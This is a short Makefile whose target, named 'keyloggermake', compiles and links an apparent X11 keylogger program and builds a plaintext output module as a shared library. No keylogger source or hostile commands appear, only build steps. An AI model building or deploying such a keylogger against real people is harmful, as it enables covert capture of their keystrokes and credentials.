keyloggermake: src/main.c include/buffer.c
	gcc -c src/main.c -Wl,-rpath,./modules -lx11 -ldl -o main.o
	gcc -c include/buffer.c -o buffer.o
	gcc main.o buffer.o -Wl,-rpath,./modules -lX11 -ldl -o result.out
	gcc -shared -rdynamic modules/mikey-plaintext.c -o modules/mikey-plaintext.so
